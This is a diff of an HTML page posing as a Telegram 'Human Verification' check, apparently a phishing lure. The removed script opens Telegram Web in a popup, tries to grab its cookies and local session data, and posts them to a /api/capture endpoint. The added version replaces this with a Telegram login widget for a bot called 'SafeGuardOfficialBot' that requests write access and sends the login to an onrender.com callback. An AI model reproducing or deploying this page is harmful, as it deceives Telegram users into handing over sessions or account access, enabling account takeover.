@@ -1,72 +1,52 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Safeguard Verification</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #212121;
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            text-align: center;
-        }
-        .button {
-            background-color: #0088cc;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        .button:hover {
-            background-color: #0077aa;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Telegram Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #212121;
+      color: white;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .button {
+      background-color: #0088cc;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 18px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .button:hover {
+      background-color: #0077aa;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Human Verification</h1>
-        <p>Click below to log in with Telegram:</p>
-        <button id="verifyButton" class="button">Click here to verify</button>
-    </div>
-    <script>
-        document.getElementById("verifyButton").addEventListener("click", () => {
-            // Open Telegram Web login in a popup
-            const popup = window.open("https://web.telegram.org/a/", "Telegram Login", "width=600,height=800");
-
-            const interval = setInterval(() => {
-                try {
-                    // Check if the popup is ready and grab cookies/session
-                    if (popup.document && popup.document.readyState === "complete") {
-                        const cookies = popup.document.cookie; // Capture cookies
-                        const session = localStorage; // Capture session data
-
-                        // Send captured data to the backend
-                        fetch("/api/capture", {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({ cookies, session: JSON.stringify(session) }),
-                        })
-                            .then(() => alert("Verification complete! Data sent."))
-                            .catch(() => alert("Failed to send data."));
-
-                        popup.close();
-                        clearInterval(interval);
-                    }
-                } catch (error) {
-                    // Keep trying until the popup is ready
-                }
-            }, 1000); // Check every second
-        });
-    </script>
+  <div class="container">
+    <h1>Human Verification</h1>
+    <p>Click below to log in with Telegram:</p>
+    <script
+      async
+      src="https://telegram.org/js/telegram-widget.js?7"
+      data-telegram-login="SafeGuardOfficialBot"
+      data-size="large"
+      data-auth-url="https://aaaa-m2f9.onrender.com/api/telegram/callback"
+      data-request-access="write"
+    ></script>
+  </div>
 </body>
 </html>
